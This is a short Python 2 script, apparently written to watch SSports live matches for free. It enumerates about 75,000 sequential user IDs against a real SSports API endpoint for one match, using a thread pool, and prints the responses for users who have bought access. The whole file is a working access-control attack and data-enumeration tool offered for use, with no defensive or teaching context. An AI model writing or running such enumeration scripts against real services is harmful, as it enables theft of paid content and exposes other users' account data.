#!/usr/bin/env python
# coding=utf-8
# author=ntwu
import threadpool as tp
import requests
import json
# 新英体育免费直播
datas = []
for i in range(17924334,17999999):
	datas.append(i)

def test(arg_):
	r = requests.get("http://security.ssports.com/api/channel/v2/watchMatch/match/1306264/user/%s/device/app"%arg_)
	json_data = json.loads(r.content)
	retData = json_data['retData']
	if retData['buy'] != 'false':
		print json_data
	# print json_data


pool = tp.ThreadPool(2)
reqs = tp.makeRequests(test, datas)
[pool.putRequest(req) for req in reqs]
pool.wait()
